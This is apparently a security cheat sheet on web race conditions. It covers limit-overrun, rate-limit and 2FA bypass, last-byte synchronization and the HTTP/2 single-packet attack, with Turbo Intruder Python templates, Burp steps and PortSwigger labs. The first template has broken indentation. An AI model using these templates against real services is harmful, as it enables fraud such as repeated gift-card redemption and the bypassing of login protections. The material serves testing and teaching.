# race condition

> race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. in a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.


## summary

- [tools](#tools)
- [methodology](#methodology)
    - [limit-overrun](#limit-overrun)
    - [rate-limit bypass](#rate-limit-bypass)
- [techniques](#techniques)
    - [http/1.1 last-byte synchronization](#http11-last-byte-synchronization)
    - [http/2 single-packet attack](#http2-single-packet-attack)
- [turbo intruder](#turbo-intruder)
    - [example 1](#example-1)
    - [example 2](#example-2)
- [labs](#labs)
- [references](#references)


## tools

- [portswigger/turbo-intruder](https://github.com/portswigger/turbo-intruder) - a burp suite extension for sending large numbers of http requests and analyzing the results.
- [javanxd/raceocat](https://github.com/javanxd/raceocat) - make exploiting race conditions in web applications highly efficient and ease-of-use.
- [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - http/2 single packet attack low level library / tool based on scapy‌ + exploit timing attacks


## methodology

### limit-overrun

limit-overrun refers to a scenario where multiple threads or processes compete to update or access a shared resource, resulting in the resource exceeding its intended limits. 

**examples**: overdrawing limit, multiple voting, multiple spending of a giftcard.

- [race condition allows to redeem multiple times gift cards which leads to free "money" - @muon4](https://hackerone.com/reports/759247)
- [race conditions can be used to bypass invitation limit - @franjkovic](https://hackerone.com/reports/115007)
- [register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)


### rate-limit bypass

rate-limit bypass occurs when an attacker exploits the lack of proper synchronization in rate-limiting mechanisms to exceed intended request limits. rate-limiting is designed to control the frequency of actions (e.g., api requests, login attempts), but race conditions can allow attackers to bypass these restrictions.

**examples**: bypassing anti-bruteforce mechanism and 2fa.

- [instagram password reset mechanism race condition - laxman muthiyah](https://youtu.be/4o9fjtmlhum)


## techniques

### http/1.1 last-byte synchronization

send every requests except the last byte, then "release" each request by sending the last byte.

execute a last-byte synchronization using turbo intruder

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.opengate('race1')
```

**examples**:

- [cracking recaptcha, turbo intruder style - james kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)


### http/2 single-packet attack

in http/2 you can send multiple http requests concurrently over a single connection. in the single-packet attack around ~20/30 requests will be sent and they will arrive at the same time on the server. using a single request remove the network jitter.

- [portswigger/turbo-intruder/race-single-packet-attack.py](https://github.com/portswigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
- burp suite
    - send a request to repeater
    - duplicate the request 20 times (ctrl+r)
    - create a new group and add all the requests
    - send group in parallel (single-packet attack)

**examples**:

- [cve-2022-4037 - discovering a race condition vulnerability in gitlab with the single-packet attack - james kettle](https://youtu.be/y0nvivucqne)


## turbo intruder

### example 1

1. send request to turbo intruder
2. use this python code as a payload of the turbo intruder

   ```python
   def queuerequests(target, wordlists):
       engine = requestengine(endpoint=target.endpoint,
                           concurrentconnections=30,
                           requestsperconnection=30,
                           pipeline=false
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseinput, gate='race1')


       engine.start(timeout=5)
   engine.opengate('race1')

       engine.complete(timeout=60)


   def handleresponse(req, interesting):
       table.add(req)
   ```

3. now set the external http header x-request: %s - :warning: this is needed by the turbo intruder
4. click "attack"


### example 2

this following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.

```python
def queuerequests(target, wordlists):
    engine = requestengine(endpoint=target.endpoint,
                           concurrentconnections=30,
                           requestsperconnection=100,
                           pipeline=false
                           )
    request1 = '''
post /target-uri-1 http/1.1
host: <redacted>
cookie: session=<redacted>

parametername=parametervalue
    '''

    request2 = '''
get /target-uri-2 http/1.1
host: <redacted>
cookie: session=<redacted>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.opengate('race1')
    engine.complete(timeout=60)
def handleresponse(req, interesting):
    table.add(req)
```


## labs

- [portswigger - limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
- [portswigger - multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [portswigger - bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [portswigger - multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [portswigger - single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
- [portswigger - exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- [portswigger - partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)


## references

- [beyond the limit: expanding single-packet race condition with a first sequence sync for breaking the 65,535 byte limit - @ryotkak - august 2, 2024](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [def con 31 - smashing the state machine the true potential of web race conditions - james kettle (@albinowax) - september 15, 2023](https://youtu.be/tkjzsab1zvi)
- [exploiting race condition vulnerabilities in web applications - javan rasokat - october 6, 2022](https://conference.hitb.org/hitbsecconf2022sin/materials/d2%20commsec%20-%20exploiting%20race%20condition%20vulnerabilities%20in%20web%20applications%20-%20javan%20rasokat.pdf)
- [new techniques and tools for web race conditions - emma stocks - august 10, 2023](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
- [race condition bug in web app: a use case - mandeep jadon - april 24, 2018](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
- [race conditions on the web - josip franjkovic - july 12, 2016](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
- [smashing the state machine: the true potential of web race conditions - james kettle (@albinowax) - august 9, 2023](https://portswigger.net/research/smashing-the-state-machine)
- [turbo intruder: embracing the billion-request attack - james kettle (@albinowax) - january 25, 2019](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)